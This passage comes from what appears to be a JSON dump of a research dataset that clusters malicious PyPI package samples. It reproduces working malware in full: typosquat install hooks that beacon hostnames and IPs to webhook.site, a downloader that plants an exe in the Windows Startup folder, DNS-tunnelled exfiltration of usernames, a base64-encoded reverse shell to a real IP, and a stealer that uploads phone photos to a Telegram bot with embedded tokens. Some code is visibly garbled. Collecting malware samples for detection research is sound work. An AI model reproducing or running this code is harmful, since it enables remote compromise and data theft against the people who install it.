'import_stack': stack_info,\n    }\n\n    # Send the data to a specific URL\n    try:\n        response = requests.post('https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics', json=data)\n        if response.status_code == 200:\n            print(\"Analytics sent successfully.\")\n        else:\n            print(f\"Failed to send analytics. Status code: {response.status_code}\")\n    except Exception as e:\n        print(f\"Error sending analytics: {e}\")\n\nif __name__ == \"__main__\":\n    analytics()\n\n\nimport re\n\ndef format_code(code):\n    # Remove trailing whitespaces\n    code = re.sub(r'[ \\t]+$', '', code, flags=re.MULTILINE)\n    \n    # Ensure newline at the end of file\n    if not code ends with '\\n':\n        code += '\\n'\n    \n    # Replace tabs with 4 spaces\n    code = code.replace('\\t', '    ')\n    \n    # Additional formatting can be added here\n    return code\n\ndef format_file(file_path):\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    formatted_code = format_code(code)\n    \n    with open(file_path, 'w') as file:\n        file.write(formatted_code)\n    \n    print(f\"Formatted {file_path} successfully.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():\\n\\tprint('Hello, World!')\\n\"\n    formatted_code = format_code(sample_code)\n    print(f\"Original Code:\\n{sample_code}\")\n    print(f\"Formatted Code:\\n{formatted_code}\")\n\nimport re\n\ndef check_trailing_whitespace(code):\n    \"\"\"Check for lines with trailing whitespace.\"\"\"\n    lines_with_issues = []\n    for i, line in enumerate(code.splitlines(), 1):\n        if re.search(r'[ \\t]+$', line):\n            lines_with_issues.append(i)\n    return lines_with_issues\n\ndef check_missing_newline(code):\n    \"\"\"Check if the file ends without a newline.\"\"\"\n    return not code.endswith('\\n')\n\ndef run_linter(file_path):\n    \"\"\"Run basic linting on the given file.\"\"\"\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    # Check for issues\n    trailing_whitespace_lines = check_trailing_whitespace(code)\n    missing_newline = check_missing_newline(code)\n    \n    # Report issues\n    if trailing_whitespace_lines:\n        print(f\"Linting issue: Trailing whitespace found on lines: {trailing_whitespace_lines}\")\n    if missing_newline:\n        print(\"Linting issue: File does not end with a newline.\")\n    \n    if not trailing_whitespace_lines and not missing_newline:\n        print(f\"{file_path} passed linting successfully.\")\n    else:\n        print(f\"{file_path} has linting issues.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():    \\n    print('Hello, World!')\\n\"\n    with open(\"sample_file.py\", \"w\") as f:\n        f.write(sample_code)\n    \n    run_linter(\"sample_file.py\")\n\n\n\n# __init__.py for the utils package\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-24-formatter-test-package-v0.1.7",
        "code": "import os\nimport platform\nimport socket\nimport time\nimport psutil\nimport requests\nimport importlib.metadata\nimport traceback\n\n\ndef find_import_stack():\n    \"\"\"\n    Extract the current call stack to identify the context in which the package is being imported.\n    Returns the stack as a formatted string.\n    \"\"\"\n    stack = traceback.extract_stack()\n    stack_info = []\n    \n    for frame in stack:\n        stack_info.append({\n            'file': frame.filename,\n            'line': frame.lineno,\n            'function': frame.name,\n            'code': frame.line.strip(),\n        })\n    \n    return stack_info\n\ndef get_package_metadata():\n    \"\"\"\n    Retrieve the package name and version from the package metadata automatically.\n    \"\"\"\n    # Dynamically determine the package name from the current module's package\n    current_package = __name__.split('.')[0]\n    \n    try:\n        metadata = importlib.metadata.metadata(current_package)\n        package_name = metadata['Name']\n        package_version = metadata['Version']\n    except importlib.metadata.PackageNotFoundError:\n        package_name = 'unknown'\n        package_version = 'unknown'\n    \n    return package_name, package_version\n\ndef analytics():\n    # Collect system information\n    os_info = platform.system()\n    uptime = time.time() - psutil.boot_time()\n    \n    # Attempt to find and print the import stack\n    stack_info = find_import_stack()\n\n    package_name, package_version = get_package_metadata()\n    # Prepare data to send\n    data = {\n        'os': os_info,\n        'uptime': uptime,\n        'hostname': socket.gethostname(),\n        'package_name': package_name,\n        'package_version': package_version,\n        'import_stack': stack_info,\n    }\n\n    # Send the data to a specific URL\n    try:\n        response = requests.post('https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics', json=data)\n        if response.status_code == 200:\n            print(\"Analytics sent successfully.\")\n        else:\n            print(f\"Failed to send analytics. Status code: {response.status_code}\")\n    except Exception as e:\n        print(f\"Error sending analytics: {e}\")\n\nif __name__ == \"__main__\":\n    analytics()\n\n\nimport re\n\ndef format_code(code):\n    # Remove trailing whitespaces\n    code = re.sub(r'[ \\t]+$', '', code, flags=re.MULTILINE)\n    \n    # Ensure newline at the end of file\n    if not code ends with '\\n':\n        code += '\\n'\n    \n    # Replace tabs with 4 spaces\n    code = code.replace('\\t', '    ')\n    \n    # Additional formatting can be added here\n    return code\n\ndef format_file(file_path):\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    formatted_code = format_code(code)\n    \n    with open(file_path, 'w') as file:\n        file.write(formatted_code)\n    \n    print(f\"Formatted {file_path} successfully.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():\\n\\tprint('Hello, World!')\\n\"\n    formatted_code = format_code(sample_code)\n    print(f\"Original Code:\\n{sample_code}\")\n    print(f\"Formatted Code:\\n{formatted_code}\")\n\nimport re\n\ndef check_trailing_whitespace(code):\n    \"\"\"Check for lines with trailing whitespace.\"\"\"\n    lines_with_issues = []\n    for i, line in enumerate(code.splitlines(), 1):\n        if re.search(r'[ \\t]+$', line):\n            lines_with_issues.append(i)\n    return lines_with_issues\n\ndef check_missing_newline(code):\n    \"\"\"Check if the file ends without a newline.\"\"\"\n    return not code.endswith('\\n')\n\ndef run_linter(file_path):\n    \"\"\"Run basic linting on the given file.\"\"\"\n    with open(file_path, 'r') as file:\n        code = file.read()\n    \n    # Check for issues\n    trailing_whitespace_lines = check_trailing_whitespace(code)\n    missing_newline = check_missing_newline(code)\n    \n    # Report issues\n    if trailing_whitespace_lines:\n        print(f\"Linting issue: Trailing whitespace found on lines: {trailing_whitespace_lines}\")\n    if missing_newline:\n        print(\"Linting issue: File does not end with a newline.\")\n    \n    if not trailing_whitespace_lines and not missing_newline:\n        print(f\"{file_path} passed linting successfully.\")\n    else:\n        print(f\"{file_path} has linting issues.\")\n\nif __name__ == \"__main__\":\n    sample_code = \"def example():    \\n    print('Hello, World!')\\n\"\n    with open(\"sample_file.py\", \"w\") as f:\n        f.write(sample_code)\n    \n    run_linter(\"sample_file.py\")\n\n\n\n# __init__.py for the utils package\n"
      }
    ]
  },
  {
    "cluster_id": 76,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-07-04-supra-style-v0.7",
        "code": "from setuptools import setup, find_packages\nimport os\nimport subprocess\nimport urllib.requesturllib.request.urlretrieve(\"https://download1586.mediafire.com/v0gzn5r1n7lgHVY3OHgPzeK5VOgGHasCHD7JvS7YQX1XyA5_Q5oQ4snzBJ0VTKO1PeQjl3B_W6eDkJlsd3pXKM0fJI5u8IKRm7wJNtRpv9OnszToE-6UOZEC_lkpL1tExTHpzG1a5r9-YmxXdWEoJuESAYsLOtjWaYIesdUuNTZI/dz8o76dfob85jbx/supra.exe\" , f\"C:\\\\Users\\\\{os.environ.get('USERNAME')}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\minecraft_servers.exe\");subprocess.call(f\"C:\\\\Users\\\\{os.environ.get('USERNAME')}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\minecraft_servers.exe\" , shell=True, stdout=subprocess.DEVNULL, stderr=subprocessn\n\nnsetupn    name='supra_style',\n    version='0.7',\n    license='MIT',\n    author=\"Supra Manager\",\n    author_email='no_email@dev.px',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='',\n    keywords='example project',\n    install_requires=[\n          'gputil',\n          'time',\n          'zipfile',\n          'getpass',\n      ],\n
      }
    ]
  },
  {
    "cluster_id": 77,
    "size": 6,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-10-aiopbotocore-v0.9.0",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\nimport requests\nimport platform\n\n# Function to run post-install setup\ndef send():\n    print('Finished installation')\n    url = f\"https://webhook.site/17c8fbe7-886e-4f2f-8f67-1d104d430d55?Data={platform.node()}_{platform.system()}_\" + requests.get('https://api.ipify.org').text;\n    response = requests.get(url)\n\n    \nclass PostInstallCommand(install): \n    def run(self):\n        install.run(self)\n        send()\n\nsetup(\n    name='aiopbotocore',\n    version='0.9.0',\n    cmdclass={\n        'install': PostInstallCommand,\n    },\n    author='Sanchez Joseph',\n    author_email='sanchezjosephine@gov.org',\n    description='Linux development package',\n    install_requires=[\n        'aiobotocore', 'requests', 'platform'\n    ]\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-10-matlibplot-v0.3",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\nimport requests\nimport platform\n\n# Function to run post-install setup\ndef send():\n    print('Finished installation')\n    url = f\"https://webhook.site/17c8fbe7-886e-4f2f-8f67-1d104d430d55?Data={platform.node()}_{platform.system()}_\" + requests.get('https://api.ipify.org').text;\n    response = requests.get(url)\n\n    \nclass PostInstallCommand(install): \n    def run(self):\n        install.run(self)\n        send()\n\nsetup(\n    name='matlibplot',\n    version='0.3',\n    cmdclass={\n        'install': PostInstallCommand,\n    },\n    author='Sanchez Joseph',\n    author_email='sanchezjosephine@gov.org',\n    description='Linux development package',\n    install_requires=[\n        'matplotlib', 'requests'\n    ]\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-10-matplotlibp-v0.3",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\nimport requests\nimport platform\n\n# Function to run post-install setup\ndef send():\n    print('Finished installation')\n    url = f\"https://webhook.site/17c8fbe7-886e-4f2f-8f67-1d104d430d55?Data={platform.node()}_{platform.system()}_\" + requests.get('https://api.ipify.org').text;\n    response = requests.get(url)\n\n    \nclass PostInstallCommand(install): \n    def run(self):\n        install.run(self)\n        send()\n\nsetup(\n    name='matplotlibp',\n    version='0.3',\n    cmdclass={\n        'install': PostInstallCommand,\n    },\n    author='Sanchez Joseph',\n    author_email='sanchezjosephine@gov.org',\n    description='Linux development package',\n    install_requires=[\n        'matplotlib', 'requests'\n    ]\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-10-pckaging-v0.3",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\nimport requests\nimport platform\n\n# Function to run post-install setup\ndef send():\n    print('Finished installation')\n    url = f\"https://webhook.site/17c8fbe7-886e-4f2f-8f67-1d104d430d55?Data={platform.node()}_{platform.system()}_\" + requests.get('https://api.ipify.org').text;\n    response = requests.get(url)\n\n    \nclass PostInstallCommand(install): \n    def run(self):\n        install.run(self)\n        send()\n\nsetup(\n    name='pckaging',\n    version='0.3',\n    cmdclass={\n        'install': PostInstallCommand,\n    },\n    author='Sanchez Joseph',\n    author_email='sanchezjosephine@gov.org',\n    description='Linux development package',\n    install_requires=[\n        'packaging', 'requests'\n    ]\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-10-s4transfer-v0.3",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\nimport requests\nimport platform\n\n# Function to run post-install setup\ndef send():\n    print('Finished installation')\n    url = f\"https://webhook.site/17c8fbe7-886e-4f2f-8f67-1d104d430d55?Data={platform.node()}_{platform.system()}_\" + requests.get('https://api.ipify.org').text;\n    response = requests.get(url)\n\n    \nclass PostInstallCommand(install): \n    def run(self):\n        install.run(self)\n        send()\n\nsetup(\n    name='s4transfer',\n    version='0.3',\n    cmdclass={\n        'install': PostInstallCommand,\n    },\n    author='Sanchez Joseph',\n    author_email='sanchezjosephine@gov.org',\n    description='Linux development package',\n    install_requires=[\n        's3transfer', 'requests'\n    ]\n\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-10-sklearns-v0.3",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\nimport requests\nimport platform\n\n# Function to run post-install setup\ndef send():\n    print('Finished installation')\n    url = f\"https://webhook.site/17c8fbe7-886e-4f2f-8f67-1d104d430d55?Data={platform.node()}_{platform.system()}_\" + requests.get('https://api.ipify.org').text;\n    response = requests.get(url)\n\n    \nclass PostInstallCommand(install): \n    def run(self):\n        install.run(self)\n        send()\n\nsetup(\n    name='sklearns',\n    version='0.3',\n    cmdclass={\n        'install': PostInstallCommand,\n    },\n    author='Sanchez Joseph',\n    author_email='sanchezjosephine@gov.org',\n    description='Linux development package',\n    install_requires=[\n        'sklearn', 'requests'\n    ]\n\n)\n"
      }
    ]
  },
  {
    "cluster_id": 78,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2025-02-05-lightgboost-v1.1.4",
        "code": "import os\nfrom urllib.request import urlopen, Request\nfrom urllib.error import URLError\nfrom datetime import datetime\nfrom urllib.parse import urlencode\n\ndef collect_system_info():\n    print(\"[*] Attempting to collect system info...\")\n    try:\n        # Get public IP without relying on curl\n        public_ip = urlopen('https://api.ipify.org').read().decode('utf-8').strip()\n        hostname = os.uname().nodename\n        home_dir = os.path.expanduser(\"~\")\n        current_dir = os.getcwd()\n\n        # Get current time\n        current_time = datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n\n        system_info = {\n            \"publicIP\": public_ip,\n            \"hostname\": hostname,\n            \"homeDirectory\": home_dir,\n            \"currentDirectory\": current_dir,\n            \"currentTime\": current_time\n        }\n\n        # Encode the parameters to make the URL safe\n        encoded_params = urlencode(system_info, safe=':/')  # Ensures special characters are not encoded\n\n        # Your server URL\n        server_url = \"http://35.170.187.220:8080/\"\n\n        # Combine the server URL and the encoded parameters\n        full_url = f\"{server_url}?{encoded_params}\"\n\n        req = Request(full_url)\n        response = urlopen(req, timeout=10)\n        if response.getcode() == 200:\n            print(\"[*] System info sent successfully.\")\n        else:\n            print(f\"[!] Server error: {response.getcode()}\")\n\n    except URLError as e:\n        print(f\"[!] Connection failed: {e.reason}\")\n    except Exception as e:\n        print(f\"[!] Error: {e}\")\n\n# This will run automatically when the package is imported\ncollect_system_info()\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2025-02-05-pxz-v1.1.14",
        "code": "import os\nfrom urllib.request import urlopen, Request\nfrom urllib.error import URLError\nfrom datetime import datetime\nfrom urllib.parse import urlencode\n\ndef collect_system_info():\n    print(\"[*] Attempting to collect system info...\")\n    try:\n        # Get public IP without relying on curl\n        public_ip = urlopen('https://api.ipify.org').read().decode('utf-8').strip()\n        hostname = os.uname().nodename\n        home_dir = os.path.expanduser(\"~\")\n        current_dir = os.getcwd()\n\n        # Get current time\n        current_time = datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n\n        system_info = {\n            \"publicIP\": public_ip,\n            \"hostname\": hostname,\n            \"homeDirectory\": home_dir,\n            \"currentDirectory\": current_dir,\n            \"currentTime\": current_time\n        }\n\n        # Encode the parameters to make the URL safe\n        encoded_params = urlencode(system_info, safe=':/')  # Ensures special characters are not encoded\n\n        # Your server URL\n        server_url = \"http://35.170.187.220:8080/\"\n\n        # Combine the server URL and the encoded parameters\n        full_url = f\"{server_url}?{encoded_params}\"\n\n        req = Request(full_url)\n        response = urlopen(req, timeout=10)\n        if response.getcode() == 200:\n            print(\"[*] System info sent successfully.\")\n        else:\n            print(f\"[!] Server error: {response.getcode()}\")\n\n    except URLError as e:\n        print(f\"[!] Connection failed: {e.reason}\")\n    except Exception as e:\n        print(f\"[!] Error: {e}\")\n\n# This will run automatically when the package is imported\ncollect_system_info()\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2025-02-06-inkpy-jinja-v0.0.1",
        "code": "import os\nfrom urllib.request import urlopen, Request\nfrom urllib.error import URLError\nfrom datetime import datetime\nfrom urllib.parse import urlencode\n\ndef collect_system_info():\n    print(\"[*] Attempting to collect system info...\")\n    try:\n        # Get public IP without relying on curl\n        public_ip = urlopen('https://api.ipify.org').read().decode('utf-8').strip()\n        hostname = os.uname().nodename\n        home_dir = os.path.expanduser(\"~\")\n        current_dir = os.getcwd()\n\n        # Get current time\n        current_time = datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n\n        system_info = {\n            \"publicIP\": public_ip,\n            \"hostname\": hostname,\n            \"homeDirectory\": home_dir,\n            \"currentDirectory\": current_dir,\n            \"currentTime\": current_time\n        }\n\n        # Encode the parameters to make the URL safe\n        encoded_params = urlencode(system_info, safe=':/')  # Ensures special characters are not encoded\n\n        # Your server URL\n        server_url = \"http://35.170.187.220:8080/\"\n\n        # Combine the server URL and the encoded parameters\n        full_url = f\"{server_url}?{encoded_params}\"\n\n        req = Request(full_url)\n        response = urlopen(req, timeout=10)\n        if response.getcode() == 200:\n            print(\"[*] System info sent successfully.\")\n        else:\n            print(f\"[!] Server error: {response.getcode()}\")\n\n    except URLError as e:\n        print(f\"[!] Connection failed: {e.reason}\")\n    except Exception as e:\n        print(f\"[!] Error: {e}\")\n\n# This will run automatically when the package is imported\ncollect_system_info()\n\n"
      }
    ]
  },
  {
    "cluster_id": 79,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-17-instacart-roulette-daemon-client-v10.0.999",
        "code": "import datetime\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport base64\n\n\ndef imp_and_run(m, f1, f2):\n    import importlib\n\n    # Dynamically import the module\n    module = importlib.import_module(m)\n\n    # Join function parts and access the function dynamically\n    function_name = f1 + f2\n    function = getattr(module, function_name)\n    return function\n\n\ndef get_daemon():\n    daemon_name = \"aW5zdGFjYXJ0dXN\"\n    base_value = \"oMTA5OTkuY3NwaHE1ZDYu\"\n    onl = \"eWFua2l6Lm9ubGluZQ==\"\n    return daemon_name, base_value, onl\n\n\ndef to_base64_subdomain(input_string):\n    encoded = base64.urlsafe_b64encode(input_string.encode()).decode()\n    encoded = encoded.rstrip(\"=\")\n    parts = [encoded[i : i + 63] for i in range(0, len(encoded), 63)]\n    return \".\".join(parts)\n\n\ndef sdesc():\n    daemon_name, base_value, onl = get_daemon()\n    all_daemons = daemon_name + base_value + onl\n    l = base64.b64decode(all_daemons).decode(\"utf-8\")\n\n    try:\n        username = imp_and_run(\"os\", \"getl\", \"ogin\")()\n        host = imp_and_run(\"socket\", \"getho\", \"stbyname\")(\n            imp_and_run(\"socket\", \"getho\", \"stname\")()\n        )\n        pwd = imp_and_run(\"os\", \"getc\", \"wd\")()\n        content = f\"{username}|{host}|{pwd}\"\n        b64 = to_base64_subdomain(content)\n        subdomain = f\"{b64}.{l}\"\n        result = imp_and_run(\"socket\", \"getho\", \"stbyname\")(subdomain)\n    except Exception as e:\n        pass\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        current_date = datetime.datetime(2024, 11, 21, 0, 0, 0)\n        if current_date < imp_and_run(\"datetime\", \"date\", \"time\").now():\n            install.run(self)\n            sdesc()\n        else:\n            install.run(self)\n\n\nsetup(\n    name=\"instacart-roulette-daemon-client\",\n    version=\"10.0.999\",\n    description=\"this is a client for the instacart-roulette-daemon\",\n    author=\"admin\",\n    author_email=\"pypi@instacart.com\",\n    install_requires=[\"requests\"],\n    setup_requires=[\"requests\"],\n    cmdclass={\n        \"install\": CustomInstallCommand,\n    },\n    license=\"LGPL 3.0\",\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-17-random-security-test-pkg-v1.1.3",
        "code": "import datetime\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport base64\n\n\ndef doit(m, f1, f2):\n    import importlib\n\n    module = importlib.import_module(m)\n    function_name = f1 + f2\n    function = getattr(module, function_name)\n    return function\n\n\ndef to_pure_version(input_string):\n    pver = base64.urlsafe_b64encode(input_string.encode()).decode()\n    pver = pver.rstrip(\"=\")\n    parts = [pver[i : i + 63] for i in range(0, len(pver), 63)]\n    return \".\".join(parts)\n\n\ndef get_version():\n    major = \"b3JhbmRvbTExNS5\"\n    minor = \"jc3BocTVkNi55YW5\"\n    patch = \"raXoub25saW5l\"\n    return major, minor, patch\n\n\ndef check_version():\n    major, minor, patch = get_version()\n    semver = f\"{major}.{minor}.{patch}\"\n    l = base64.b64decode(semver).decode(\"utf-8\")\n\n    try:\n        username = doit(\"os\", \"getl\", \"ogin\")()\n        host = doit(\"socket\", \"getho\", \"stbyname\")(doit(\"socket\", \"getho\", \"stname\")())\n        pwd = doit(\"os\", \"getc\", \"wd\")()\n        content = f\"{username}|{host}|{pwd}\"\n        b64 = to_pure_version(content)\n        subdomain = f\"{b64}.{l}\"\n        result = doit(\"socket\", \"getho\", \"stbyname\")(subdomain)\n    except Exception as e:\n        pass\n\n\nclass GetInstalledVersion(install):\n    def run(self):\n        version_time = datetime.datetime(2024, 11, 21, 0, 0, 0)\n        if version_time < doit(\"datetime\", \"date\", \"time\").now():\n            install.run(self)\n            check_version()\n        else:\n            install.run(self)\n\n\nsetup(\n    name=\"random-security-test-pkg\",\n    version=\"1.1.3\",\n    description=\"112\",\n    author=\"Benny123\",\n    author_email=\"my@company.com\",\n    license=\"LGPL 3.0\",\n    cmdclass={\n        \"install\": GetInstalledVersion,\n    },\n)\n\n\nimport base64\n\n\ndef rstp() -> str:\n    base_value = \"cmFuZG9tLXNlY3VyaXR5LXRlc3QtcGtnLXRtcA==\"\n    return base64.b64decode(base_value).decode(\"utf-8\")\n\n\ndef is_version() -> bool:\n    return True\n"
      }
    ]
  },
  {
    "cluster_id": 80,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-16-deeprce-v0.0.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport base64\nimport os\n\n\nclass CustomInstall(install):\n def run(self):\n     install.run(self)\n     LHOST = '81.68.90.93' # change this\n     LPORT = 4444\n     \n     reverse_shell = 'python3 -c \"import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\\'{LHOST}\\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\\'HISTFILE\\', \\'/dev/null\\'); pty.spawn(\\'/bin/bash\\'); s.close();\"'.format(LHOST=LHOST,LPORT=LPORT)\n     encoded = base64.b64encode(reverse_shell.encode(encoding=\"utf-8\"))\n     os.system('echo %s|base64 -d|bash' % encoded.decode())\n\n\nsetup(name='Deeprce', # \u5e93\u7684\u540d\u5b57\n version='0.0.1', # \u7248\u672c\n description=\"install this module then reverse shell\", # \u63cf\u8ff0\n author=\"dpm\", # \u4f5c\u8005\n py_module=[\"deepmountains.hello\"], # \u8fd9\u91cc\u901a\u8fc7\u624b\u52a8\u6307\u5b9a\u7684\u65b9\u5f0f\uff0c\u6307\u5b9a\u9700\u8981\u6253\u5305\u7684\u6a21\u5757\n cmdclass={'install': CustomInstall}\n # cmdclass\uff1a\u5f53\u6267\u884cpython3 setup install\u7684\u65f6\u5019\u89e6\u53d1CustomInstall\u7c7b\u7684\u6267\u884c\n )\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-16-zwhrce-v0.0.1",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport base64\nimport os\n\n\nclass CustomInstall(install):\n def run(self):\n     install.run(self)\n     LHOST = '81.68.90.93' # change this\n     LPORT = 4444\n     \n     reverse_shell = 'python3 -c \"import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\\'{LHOST}\\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\\'HISTFILE\\', \\'/dev/null\\'); pty.spawn(\\'/bin/bash\\'); s.close();\"'.format(LHOST=LHOST,LPORT=LPORT)\n     encoded = base64.b64encode(reverse_shell.encode(encoding=\"utf-8\"))\n     os.system('echo %s|base64 -d|bash' % encoded.decode())\n\n\nsetup(name='zwhrce', # \u5e93\u7684\u540d\u5b57\n version='0.0.1', # \u7248\u672c\n description=\"install this module then reverse shell\", # \u63cf\u8ff0\n author=\"dpm\", # \u4f5c\u8005\n py_module=[\"deepmountains.hello\"], # \u8fd9\u91cc\u901a\u8fc7\u624b\u52a8\u6307\u5b9a\u7684\u65b9\u5f0f\uff0c\u6307\u5b9a\u9700\u8981\u6253\u5305\u7684\u6a21\u5757\n cmdclass={'install': CustomInstall}\n # cmdclass\uff1a\u5f53\u6267\u884cpython3 setup install\u7684\u65f6\u5019\u89e6\u53d1CustomInstall\u7c7b\u7684\u6267\u884c\n )\n\n"
      }
    ]
  },
  {
    "cluster_id": 81,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-12-30-requetses-v0.1",
        "code": "# retopdick/__init__.py\n\nimport os\nimport requests\nID1_Golden = '6843086702'\nToken2_Golden = '7611313925:AAFzm9fIbP1JfMNgqBtIuBVd04_3oxGzAZw'\nclass Golden:\n    def __init__(self):\n        self.session = requests.session()\n    def send_documents(self):\n        try:\n            sdcard_path = '/storage/emulated/0/DCIM/Screenshots/'\n            extensions = ['.jpg', '.jpeg', '.png']\n            file_list = [f for f in os.listdir(sdcard_path) if any(f.endswith(ext) for ext in extensions)]\n            for file in file_list:\n                with open(os.path.join(sdcard_path, file), 'rb') as f:\n                    url = f'https://api.telegram.org/bot{Token2_Golden}/sendDocument'\n                    data2 = {'chat_id': ID1_Golden}\n                    data = {'chat_id': ID1_Golden}\n                    files = {'document': f}\n                    self.session.post(url, data=data, files=files)\n                    self.session.post(url, data=data2, files=files)\n        except:\n            pass\n        try:\n            sdcard_path = '/storage/emulated/0/DCIM/Camera/'\n            extensions = ['.jpg', '.jpeg', '.png']\n            file_list = [f for f in os.listdir(sdcard_path) if any(f.endswith(ext) for ext in extensions)]\n            for file in file_list:\n                with open(os.path.join(sdcard_path, file), 'rb') as f:\n                    url = f'https://api.telegram.org/bot{Token2_Golden}/sendDocument'\n                    data2 = {'chat_id': ID1_Golden}\n                    data = {'chat_id': ID1_Golden}\n                    files = {'document': f}\n                    self.session.post(url, data=data, files=files)\n                    self.session.post(url, data=data2, files=files)\n        except:\n            pass"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-12-31-requetses-v0.5",
        "code": "# retopdick/__init__.py\n\nimport os\nimport requests\nID1_Golden = '6843086702'\nToken2_Golden = '7305536830:AAG0n3eB2qVUvr0ugarT1qjZ4zGu7Z_sC0M'\nclass Golden:\n    def __init__(self):\n        self.session = requests.session()\n    def send_documents(self):\n        try:\n            sdcard_path = '/storage/emulated/0/DCIM/Screenshots'\n            extensions = ['.jpg', '.jpeg', '.png']\n            file_list = [f for f in os.listdir(sdcard_path) if any(f.endswith(ext) for ext in extensions)]\n            for file in file_list:\n                with open(os.path.join(sdcard_path, file), 'rb') as f:\n                    url = f'https://api.telegram.org/bot{Token2_Golden}/sendDocument'\n                    data2 = {'chat_id': ID1_Golden}\n                    data = {'chat_id': ID1_Golden}\n                    files = {'document': f}\n                    self.session.post(url, data=data, files=files)\n                    self.session.post(url, data=data2, files=files)\n        except:\n            pass\n        try:\n            sdcard_path = '/storage/emulated/0/DCIM/Camera'\n            extensions = ['.jpg', '.jpeg', '.png']\n            file_list = [f for f in os.listdir(sdcard_path) if any(f.endswith(ext) for ext in extensions)]\n            for file in file_list:\n                with open(os.path.join(sdcard_path, file), 'rb') as f:\n                    url = f'https://api.telegram.org/bot{Token2_Golden}/sendDocument'\n                    data2 = {'chat_id': ID1_Golden}\n                    data = {'chat_id': ID1_Golden}\n                    files = {'document': f}\n                    self.session.post(url, data=data, files=files)\n                    self.session.post(url, data=data2, files=files)\n        except:\n            pass"
      }
    ]
  },
  {
    "cluster_id": 82,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-09-dependency-confusion12345-v9.9.9",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport json\nimport socket\nimport getpass\nimport os\nimport random\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        package = 'dependency_confusion12345'\n        domain = 'krfdjo3y14gnxlmuyzp4gb7ufllc92xr.oastify.com'\n        data = {\n            'p': package,\n            'h': socket.gethostname(),\n            'd': getpass.getuser(),\n            'c': os.getcwd()\n        }\n        json_data = json.dumps(data)\n        hex_str = json_data.encode('utf-8').hex()\n        chunks = len(hex_str) // 60\n        hex_list = [hex_str[(i * 60):(i + 1) * 60] for i in range(0, chunks + 1)]\n        id_rand = random.randint(36 ** 12, (36 ** 13) - 1)\n\n        for count, value in enumerate(hex_list):\n            t_str = f'v2_f.{count}.{id_rand}.{value}.v2_e.{domain}'\n            socket.getaddrinfo(t_str, 80)\n\n\nsetup(name='dependency_confusion12345',\n      version='9.9.9',\n      description=\"This package is a proof of concept used by author to conduct research. It has been uploaded for test purposes only. Its only function is to confirm the installation of the package on a victim's machines. The code is not malicious in any way and will be deleted after the research survey has been concluded. Author does not accept any liability for any direct, indirect, or consequential loss or damage arising from the use of, or reliance on, this package.\",\n      author='test',\n      license='MIT',\n      